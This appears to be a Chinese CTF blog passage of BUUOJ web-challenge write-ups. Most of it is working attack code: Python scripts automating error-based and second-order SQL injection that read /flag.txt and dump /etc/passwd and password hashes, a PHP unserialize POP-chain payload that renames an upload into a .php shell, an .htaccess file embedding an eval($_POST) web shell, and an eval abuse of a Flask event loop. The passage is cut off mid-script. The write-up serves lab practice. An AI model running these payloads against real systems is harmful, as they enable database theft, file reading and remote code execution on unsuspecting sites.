<p>阅读代码发现,search处有sql注入,但是有以下限制:<code>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;;</code></p>
<p>change处有明显的二次注入,无限制,但是是update</p>
<pre><code>&quot;update `user` set `address`=&#39;&quot;.$address.&quot;&#39;, `old_address`=&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where `user_id`=&quot;.$row[&#39;user_id&#39;];</code></pre><p>我们利用报错注入来获取回显</p>
<pre><code>information_schema,test,performance_schema,ctftraining,mysql,ctfusers
ctftraining:FLAG_TABLE,news,users
FLAG_TABLE:FLAG_COLUMN
users:id,username,password,ip,time
news:id,title,content,time
ctfusers:user
user:user_id,address,old_address,user_name,phone</code></pre><pre><code>1dogThe domestic dog (Canis lupus familiaris when considered a subspecies of the wolf or Canis familiaris when considered a distinct species)[4] is a member of the genus Canis (canines), which forms part of the wolf-like canids,[5] and is the most widely abundant terrestrial carnivore.1571838684,2catThe cat or domestic cat (Felis catus) is a small carnivorous mammal.[1][2] 
It is the only domesticated species in the family Felidae.[4] The cat is either a house cat, kept as a pet, or a feral cat, freely ranging and avoiding human contact.1571838684,3birdBirds, also known as Aves, are a group of endothermic vertebrates, characterised by feathers, toothless beaked jaws, the laying of hard-shelled eggs, a high metabolic rate, a four-chambered heart, and a strong yet lightweight skeleton.1571838684,4flagFlag is in the database but not here.1571838684

1,admin,21232f297a57a5a743894a0e4a801fc3,127.0.0.1,1571838684,2,guest,084e0343a0486ff05530df6c705c8bb4,127.0.0.1,1571838684,3,virink,a4346e75cc1dd161a8d57f3b2d5d82d0,127.0.0.1,1571838684  </code></pre><p>/etc/passwd</p>
<pre><code>root:x:0:0:root:/root:/bin/ash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
man:x:13:15:man:/usr/man:/sbin/nologin
postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
postgres:x:70:70::/var/lib/postgresql:/bin/sh
cyrus:x:85:12::/usr/cyrus:/sbin/nologin
vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
www-data:x:82:82:Linux User,,,:/home/www-data:/sbin/nologin
mysql:x:100:101:mysql:/var/lib/mysql:/sbin/nologin
nginx:x:101:102:nginx:/var/lib/nginx:/sbin/nologin</code></pre><pre><code>dbf39bacca9e.log</code></pre><p>艹,最后百度下发现flag再flag.txt里面</p>
<p><code>flag{c90595fb-9a36-4257-ba55-9181d7584edc}</code></p>
<p>附上脚本:</p>
<pre><code class="python">import requests
import random
import re
import time
def sql_inj(sql):
    num=random.randint(0,9999999999)
    result=&quot;&quot;
    count=1
    while True:
        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/confirm.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: &quot;&#39;+(updatexml(1,concat(0x7e,substr(({sql}),{count},30),0x7e),1))#&quot;.format(sql=sql,count=count)}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)

        burp0_url = &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn/change.php&quot;
        burp0_headers = {&quot;Cache-Control&quot;: &quot;max-age=0&quot;, &quot;Origin&quot;: &quot;http://c76026d6-3667-407c-926e-dea17844c361.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://9f5e00e9-1ee3-46ec-bc40-5d37fcbb00a2.node3.buuoj.cn/change.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;user_name&quot;: num, &quot;phone&quot;: num, &quot;address&quot;: num}
        res=requests.post(burp0_url, headers=burp0_headers, data=burp0_data)
        print(res.text)
        tmp=re.match(r&#39;.*~(.*)~.*&#39;,res.text,flags=re.DOTALL).group(1)
        result+=tmp
        print(result)
        if tmp.strip() is &quot;&quot;:
            break
        count+=30
        num+=1
        time.sleep(0.5)

sql_inj(&quot;SELECT (load_file(&#39;/flag.txt&#39;))&quot;)
</code></pre>
<h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>报错后发现thinkphp的壳披着Discuz的皮,观察cookie发现,存在反序列化点</p>
<p>扫目录后,从<a href="http://www.tar.gz中拿到源码,从源码中很容易构造pop链" target="_blank" rel="noopener">www.tar.gz中拿到源码,从源码中很容易构造pop链</a></p>
<p>payload:</p>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Index extends Controller
{
    public $profile;
    public $profile_db;

    public function index()
    {
        if($this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }
        return $this-&gt;fetch(&quot;index&quot;);
    }

    public function home(){
        if(!$this-&gt;login_check()){
            $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
            $this-&gt;redirect($curr_url,302);
            exit();
        }

        if(!$this-&gt;check_upload_img()){
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;upload&quot;);
        }else{
            $this-&gt;assign(&quot;img&quot;,$this-&gt;profile_db[&#39;img&#39;]);
            $this-&gt;assign(&quot;username&quot;,$this-&gt;profile_db[&#39;username&#39;]);
            return $this-&gt;fetch(&quot;home&quot;);
        }
    }

    public function login_check(){
        $profile=cookie(&#39;user&#39;);
        if(!empty($profile)){
            $this-&gt;profile=unserialize(base64_decode($profile));
            #$this-&gt;profile_db=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,intval($this-&gt;profile[&#39;ID&#39;]))-&gt;find();
            if(array_diff(array(1,1,1),$this-&gt;profile)==null){
                return 1;
            }else{
                return 0;
            }
        }
    }

    public function check_upload_img(){
        if(!empty($this-&gt;profile) &amp;&amp; !empty($this-&gt;profile_db)){
            if(empty($this-&gt;profile_db[&#39;img&#39;])){
                return 0;
            }else{
                return 1;
            }
        }
    }

    public function logout(){
        cookie(&quot;user&quot;,null);
        $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
        $this-&gt;redirect($curr_url,302);
        exit();
    }

    public function test()
    {
        $a=urldecode(&quot;O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A0%3A%22%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A37%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Cindex.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D&quot;);
        $b=substr($a,0,strlen($a)-1);
        $b=str_replace(&quot;\&quot;Error\&quot;:7&quot;,&quot;\&quot;Error\&quot;:8&quot;,$b);
        $b.=&quot;s:3:\&quot;aaa\&quot;;&quot;.serialize(new Register()).&quot;}&quot;;

        $b=&#39;a:6:{s:2:&quot;ID&quot;;i:9;s:8:&quot;username&quot;;s:4:&quot;aaaa&quot;;s:3:&quot;img&quot;;N;s:5:&quot;email&quot;;s:11:&quot;cao0@qq.com&quot;;s:8:&quot;password&quot;;s:32:&quot;74b87337454200d4d33f80c4663dc5e5&quot;;s:3:&quot;abc&quot;;&#39;.$b.&#39;}&#39;;
        #return &quot;a&quot;;
        return urlencode(base64_encode($b));
    }

    public function __get($name)
    {
        return url;
    }

}

</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;
use think\Controller;

class Register extends Controller
{
    public $checker;
    public $registed;

    public function __construct()
    {
        $this-&gt;registed=0;
        $this-&gt;checker=new Profile();
    }

    public function register()
    {
        if ($this-&gt;checker) {
            if($this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/home&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }
        if (!empty(input(&quot;post.username&quot;)) &amp;&amp; !empty(input(&quot;post.email&quot;)) &amp;&amp; !empty(input(&quot;post.password&quot;))) {
            $email = input(&quot;post.email&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $password = input(&quot;post.password&quot;, &quot;&quot;, &quot;addslashes&quot;);
            $username = input(&quot;post.username&quot;, &quot;&quot;, &quot;addslashes&quot;);
            if($this-&gt;check_email($email)) {
                if (empty(db(&quot;user&quot;)-&gt;where(&quot;username&quot;, $username)-&gt;find()) &amp;&amp; empty(db(&quot;user&quot;)-&gt;where(&quot;email&quot;, $email)-&gt;find())) {
                    $user_info = [&quot;email&quot; =&gt; $email, &quot;password&quot; =&gt; md5($password), &quot;username&quot; =&gt; $username];
                    if (db(&quot;user&quot;)-&gt;insert($user_info)) {
                        $this-&gt;registed = 1;
                        $this-&gt;success(&#39;Registed successful!&#39;, url(&#39;../index&#39;));
                    } else {
                        $this-&gt;error(&#39;Registed failed!&#39;, url(&#39;../index&#39;));
                    }
                } else {
                    $this-&gt;error(&#39;Account already exists!&#39;, url(&#39;../index&#39;));
                }
            }else{
                $this-&gt;error(&#39;Email illegal!&#39;, url(&#39;../index&#39;));
            }
        } else {
            $this-&gt;error(&#39;Something empty!&#39;, url(&#39;../index&#39;));
        }
    }

    public function check_email($email){
        $pattern = &quot;/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,})$/&quot;;
        preg_match($pattern, $email, $matches);
        if(empty($matches)){
            return 0;
        }else{
            return 1;
        }
    }

    public function __destruct()
    {
        if(!$this-&gt;registed){
            $this-&gt;checker-&gt;index();
        }
    }


}</code></pre>
<pre><code class="php">&lt;?php
namespace app\web\controller;

use think\Controller;
class Profile extends Controller
{
    public $checker;
    public $filename_tmp;
    public $filename;
    public $upload_menu;
    public $ext;
    public $img;
    public $except=array(&#39;index&#39;=&gt;&#39;upload_img&#39;);
    public $index;

    public function __construct()
    {
        $this-&gt;index=&quot;upload_img&quot;;
        $this-&gt;checker=0;
        $this-&gt;ext=1;
        $this-&gt;filename_tmp=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.png&quot;;
        $this-&gt;filename=&quot;../public/upload/76d9f00467e5ee6abc3ca60892ef304e/fb5c81ed3a220004b71069645f112867.php&quot;;
    }

    public function upload_img(){
        if($this-&gt;checker){
            if(!$this-&gt;checker-&gt;login_check()){
                $curr_url=&quot;http://&quot;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;SCRIPT_NAME&#39;].&quot;/index&quot;;
                $this-&gt;redirect($curr_url,302);
                exit();
            }
        }

        if(!empty($_FILES)){
            $this-&gt;filename_tmp=$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];
            $this-&gt;filename=md5($_FILES[&#39;upload_file&#39;][&#39;name&#39;]).&quot;.png&quot;;
            $this-&gt;ext_check();
        }
        if($this-&gt;ext) {
            if(getimagesize($this-&gt;filename_tmp)) {
                @copy($this-&gt;filename_tmp, $this-&gt;filename);
                @unlink($this-&gt;filename_tmp);
                $this-&gt;img=&quot;../upload/$this-&gt;upload_menu/$this-&gt;filename&quot;;
                $this-&gt;update_img();
            }else{
                $this-&gt;error(&#39;Forbidden type!&#39;, url(&#39;../index&#39;));
            }
        }else{
            $this-&gt;error(&#39;Unknow file type!&#39;, url(&#39;../index&#39;));
        }
    }

    public function update_img(){
        $user_info=db(&#39;user&#39;)-&gt;where(&quot;ID&quot;,$this-&gt;checker-&gt;profile[&#39;ID&#39;])-&gt;find();
        if(empty($user_info[&#39;img&#39;]) &amp;&amp; $this-&gt;img){
            if(db(&#39;user&#39;)-&gt;where(&#39;ID&#39;,$user_info[&#39;ID&#39;])-&gt;data([&quot;img&quot;=&gt;addslashes($this-&gt;img)])-&gt;update()){
                $this-&gt;update_cookie();
                $this-&gt;success(&#39;Upload img successful!&#39;, url(&#39;../home&#39;));
            }else{
                $this-&gt;error(&#39;Upload file failed!&#39;, url(&#39;../index&#39;));
            }
        }
    }

    public function update_cookie(){
        $this-&gt;checker-&gt;profile[&#39;img&#39;]=$this-&gt;img;
        cookie(&quot;user&quot;,base64_encode(serialize($this-&gt;checker-&gt;profile)),3600);
    }

    public function ext_check(){
        $ext_arr=explode(&quot;.&quot;,$this-&gt;filename);
        $this-&gt;ext=end($ext_arr);
        if($this-&gt;ext==&quot;png&quot;){
            return 1;
        }else{
            return 0;
        }
    }

    public function __get($name)
    {
        return $this-&gt;except[$name];
    }

    public function __call($name, $arguments)
    {
        if($this-&gt;{$name}){
            $this-&gt;{$this-&gt;{$name}}($arguments);
        }
    }

}</code></pre>
<h2 id="CISCN2019-华东南赛区-Web11"><a href="#CISCN2019-华东南赛区-Web11" class="headerlink" title="[CISCN2019 华东南赛区]Web11"></a>[CISCN2019 华东南赛区]Web11</h2><p>简单的smarty ssti</p>
<h2 id="Futurella"><a href="#Futurella" class="headerlink" title="Futurella"></a>Futurella</h2><p>F12</p>
<h2 id="2020-新春红包题-1"><a href="#2020-新春红包题-1" class="headerlink" title="2020 新春红包题 1"></a>2020 新春红包题 1</h2><p>和2019的eis中的pop一摸一样,我之前也做出来了,再看的时候居然不会了???????????</p>
<p> <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> </p>
<p>唯一不同的是,这题会对文件名进行检测</p>
<pre><code class="php">public function getCacheKey(string $name): string {
        // 使缓存文件名随机
        $cache_filename = $this-&gt;options[&#39;prefix&#39;] . uniqid() . $name;
        if(substr($cache_filename, -strlen(&#39;.php&#39;)) === &#39;.php&#39;) {
            die(&#39;?&#39;);
        }
        return $cache_filename;
    }</code></pre>
<p>我在这里卡了好久,还是去偷窥wp解决的</p>
<p>我们利用<code>uniqid()/../filename</code>来绕过uniqid,</p>
<p>利用<code>index.php/.</code>=<code>index.php</code>来绕过后缀名检测</p>
<p>其他解法: <a href="https://www.zhaoj.in/read-6397.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6397.html</a> </p>
<ol>
<li>利用.user.ini</li>
<li>利用shell中``的优先级大于”来命令执行</li>
</ol>
<h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><pre><code class="php">&lt;?php
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    include_once(&quot;fl3g.php&quot;);
    if(!isset($_GET[&#39;content&#39;]) || !isset($_GET[&#39;filename&#39;])) {
        highlight_file(__FILE__);
        die();
    }
    $content = $_GET[&#39;content&#39;];
    if(stristr($content,&#39;on&#39;) || stristr($content,&#39;html&#39;) || stristr($content,&#39;type&#39;) || stristr($content,&#39;flag&#39;) || stristr($content,&#39;upload&#39;) || stristr($content,&#39;file&#39;)) {
        echo &quot;Hacker&quot;;
        die();
    }
    $filename = $_GET[&#39;filename&#39;];
    if(preg_match(&quot;/[^a-z\.]/&quot;, $filename) == 1) {
        echo &quot;Hacker&quot;;
        die();
    }
    $files = scandir(&#39;./&#39;); 
    foreach($files as $file) {
        if(is_file($file)){
            if ($file !== &quot;index.php&quot;) {
                unlink($file);
            }
        }
    }
    file_put_contents($filename, $content . &quot;\nJust one chance&quot;);
?&gt;</code></pre>
<p>可以任意写文件,写个php文件后发现,不解析,估计是htaccess的,</p>
<p>于是写htaccess,利用<code>#\</code>来绕过末尾添加<code>\nJust one chance</code>,将其注释</p>
<p>最后的payload</p>
<pre><code>#&lt;?php die(eval($_POST[1]));?&gt;
php_value auto_prepend_fi\
le &quot;.htaccess&quot;
#\</code></pre><h2 id="Kookie"><a href="#Kookie" class="headerlink" title="Kookie"></a>Kookie</h2><p>修改cookie</p>
<h2 id="homebrew-event-loop"><a href="#homebrew-event-loop" class="headerlink" title="homebrew event loop"></a>homebrew event loop</h2><pre><code class="python">from flask import Flask, session, request, Response
import urllib

app = Flask(__name__)
app.secret_key = &#39;*********************&#39;  # censored
url_prefix = &#39;/d5afe1f66147e857&#39;


def FLAG():
    return &#39;*********************&#39;  # censored


def trigger_event(event):
    session[&#39;log&#39;].append(event)
    if len(session[&#39;log&#39;]) &gt; 5:
        session[&#39;log&#39;] = session[&#39;log&#39;][-5:]
    if type(event) == type([]):
        request.event_queue += event
    else:
        request.event_queue.append(event)


def get_mid_str(haystack, prefix, postfix=None):
    haystack = haystack[haystack.find(prefix)+len(prefix):]
    if postfix is not None:
        haystack = haystack[:haystack.find(postfix)]
    return haystack


class RollBackException:
    pass


def execute_event_loop():
    valid_event_chars = set(
        &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#&#39;)
    resp = None
    while len(request.event_queue) &gt; 0:
        # `event` is something like &quot;action:ACTION;ARGS0#ARGS1#ARGS2......&quot;
        event = request.event_queue[0]
        request.event_queue = request.event_queue[1:]
        if not event.startswith((&#39;action:&#39;, &#39;func:&#39;)):
            continue
        for c in event:
            if c not in valid_event_chars:
                break
        else:
            is_action = event[0] == &#39;a&#39;
            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)
            except RollBackException:
                if resp is None:
                    resp = &#39;&#39;
                resp += &#39;ERROR! All transactions have been cancelled. &lt;br /&gt;&#39;
                resp += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
                session[&#39;num_items&#39;] = request.prev_session[&#39;num_items&#39;]
                session[&#39;points&#39;] = request.prev_session[&#39;points&#39;]
                break
            except Exception, e:
                if resp is None:
                    resp = &#39;&#39;
                # resp += str(e) # only for debugging
                continue
            if ret_val is not None:
                if resp is None:
                    resp = ret_val
                else:
                    resp += ret_val
    if resp is None or resp == &#39;&#39;:
        resp = (&#39;404 NOT FOUND&#39;, 404)
    session.modified = True
    return resp


@app.route(url_prefix+&#39;/&#39;)
def entry_point():
    querystring = urllib.unquote(request.query_string)
    request.event_queue = []
    if querystring == &#39;&#39; or (not querystring.startswith(&#39;action:&#39;)) or len(querystring) &gt; 100:
        querystring = &#39;action:index;False#False&#39;
    if &#39;num_items&#39; not in session:
        session[&#39;num_items&#39;] = 0
        session[&#39;points&#39;] = 3
        session[&#39;log&#39;] = []
    request.prev_session = dict(session)
    trigger_event(querystring)
    return execute_event_loop()

# handlers/functions below --------------------------------------


def view_handler(args):
    page = args[0]
    html = &#39;&#39;
    html += &#39;[INFO] you have {} diamonds, {} points now.&lt;br /&gt;&#39;.format(
        session[&#39;num_items&#39;], session[&#39;points&#39;])
    if page == &#39;index&#39;:
        html += &#39;&lt;a href=&quot;./?action:index;True%23False&quot;&gt;View source code&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;shop&quot;&gt;Go to e-shop&lt;/a&gt;&lt;br /&gt;&#39;
        html += &#39;&lt;a href=&quot;./?action:view;reset&quot;&gt;Reset&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;shop&#39;:
        html += &#39;&lt;a href=&quot;./?action:buy;1&quot;&gt;Buy a diamond (1 point)&lt;/a&gt;&lt;br /&gt;&#39;
    elif page == &#39;reset&#39;:
        del session[&#39;num_items&#39;]
        html += &#39;Session reset.&lt;br /&gt;&#39;
    html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;
    return html


def index_handler(args):
    bool_show_source = str(args[0])
    bool_download_source = str(args[1])
    if bool_show_source == &#39;True&#39;:

        source = open(&#39;eventLoop.py&#39;, &#39;r&#39;)
        html = &#39;&#39;
        if bool_download_source != &#39;True&#39;:
            html += &#39;&lt;a href=&quot;./?action:index;True%23True&quot;&gt;Download this .py file&lt;/a&gt;&lt;br /&gt;&#39;
            html += &#39;&lt;a href=&quot;./?action:view;index&quot;&gt;Go back to index.html&lt;/a&gt;&lt;br /&gt;&#39;

        for line in source:
            if bool_download_source != &#39;True&#39;:
                html += line.replace(&#39;&amp;&#39;, &#39;&amp;amp;&#39;).replace(&#39;\t&#39;, &#39;&amp;nbsp;&#39;*4).replace(
                    &#39; &#39;, &#39;&amp;nbsp;&#39;).replace(&#39;&lt;&#39;, &#39;&amp;lt;&#39;).replace(&#39;&gt;&#39;, &#39;&amp;gt;&#39;).replace(&#39;\n&#39;, &#39;&lt;br /&gt;&#39;)
            else:
                html += line
        source.close()

        if bool_download_source == &#39;True&#39;:
            headers = {}
            headers[&#39;Content-Type&#39;] = &#39;text/plain&#39;
            headers[&#39;Content-Disposition&#39;] = &#39;attachment; filename=serve.py&#39;
            return Response(html, headers=headers)
        else:
            return html
    else:
        trigger_event(&#39;action:view;index&#39;)


def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])


def consume_point_function(args):
    point_to_consume = int(args[0])
    if session[&#39;points&#39;] &lt; point_to_consume:
        raise RollBackException()
    session[&#39;points&#39;] -= point_to_consume


def show_flag_function(args):
    flag = args[0]
    # return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.
    return &#39;You naughty boy! ;) &lt;br /&gt;&#39;


def get_flag_handler(args):
    if session[&#39;num_items&#39;] &gt;= 5:
        # show_flag_function has been disabled, no worries
        trigger_event(&#39;func:show_flag;&#39; + FLAG())
    trigger_event(&#39;action:view;index&#39;)


if __name__ == &#39;__main__&#39;:
    app.run(debug=False, host=&#39;0.0.0.0&#39;)</code></pre>
<p>我们观察:</p>
<pre><code class="python">            action = get_mid_str(event, &#39;:&#39;, &#39;;&#39;)
            args = get_mid_str(event, action+&#39;;&#39;).split(&#39;#&#39;)
            try:
                event_handler = eval(
                    action + (&#39;_handler&#39; if is_action else &#39;_function&#39;))
                ret_val = event_handler(args)</code></pre>
<p>这里我们可以</p>
<p>在action后面加个#,来达到任意命令执行,但是传入的参数只能是一个list,在这里卡住我了</p>
<p>继续分析发现,这个程序的功能都基于自制的event_loop,而trigger_event()负责添加event,当传入一个list时,他会直接event+=list</p>
<p>也就是说我们可以控制event_loop的执行顺序,</p>
<p>在get_flag_handler中,我们可以将flag记录到session中但是,要求diomand&gt;=5,而正常来说我们最多只有3个</p>
<p>我们观察buy</p>
<pre><code class="python">def buy_handler(args):
    num_items = int(args[0])
    if num_items &lt;= 0:
        return &#39;invalid number({}) of diamonds to buy&lt;br /&gt;&#39;.format(args[0])
    session[&#39;num_items&#39;] += num_items
    trigger_event([&#39;func:consume_point;{}&#39;.format(
        num_items), &#39;action:view;index&#39;])</code></pre>
<p>这个是先将物品添加然后向event_loop中添加事件,结合我们前面的发现,我们可以在调用buy_handler后直接调用get_flag_handler,这样我们就能拿到flag了</p>
<p>访问:<code>d5afe1f66147e857/?action:trigger_event%23;action:buy;99%23action:get_flag;%23</code>,将session解码后拿到flag</p>
<p><code>flag{ba772083-fe23-4258-897e-63c9a99ff66f}</code></p>
<h2 id="easysql"><a href="#easysql" class="headerlink" title="easysql"></a>easysql</h2><pre><code class="python">import requests
import re,time
import binascii
def sql_inj(sql):
    result=&quot;&quot;
    count=1
    while True:
        if result!=&quot;&quot;:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),{result},\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        else:
            username=&quot;admin\&quot;-(updatexml(1,concat(0x7e,replace(({sql}),\&quot;\&quot;,\&quot;\&quot;),0x7e),1))#&quot;.format(sql=sql,result=(&quot;0x&quot;+str(binascii.hexlify(bytes(result,encoding=&quot;ascii&quot;)),encoding=&quot;ascii&quot;)))
        burp0_url = &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn:80/register.php&quot;
        burp0_cookies = {&quot;PHPSESSID&quot;: &quot;r658aaumj82f5f6itd5freua14&quot;}
        burp0_headers = {&quot;Pragma&quot;: &quot;no-cache&quot;, &quot;Cache-Control&quot;: &quot;no-cache&quot;, &quot;Origin&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;, &quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;, &quot;Referer&quot;: &quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/register.php&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;, &quot;Connection&quot;: &quot;close&quot;}
        burp0_data = {&quot;username&quot;:username , &quot;password&quot;: &quot;a&quot;, &quot;email&quot;: &quot;a&quot;}
        res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
        print(username)
        #print(res.text)
        session = requests.session()
        url=&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/login.php&quot;
        data={
            &quot;username&quot;:username,
            &quot;password&quot;:&quot;a&quot;
        }
        res=session.post(url, data=data) 
        #print(res.text)
        res=session.post(&quot;http://68c7485c-1d1c-4e0e-b89a-ae73b0af1046.node3.buuoj.cn/changepwd.php&quot;,data={&quot;oldpass&quot;:&quot;a&quot;,&quot;newpass&quot;:&quot;a&quot;})
        print(res.text)
        tmp=re.match(r&quot;.*XPATH syntax error: &#39;(.*)&#39;.*&quot;,res.text,flags=re.DOTALL).group(1)
        if tmp!=&quot;&quot; and tmp[0]==&quot;~&quot;:
            tmp=tmp[1:]
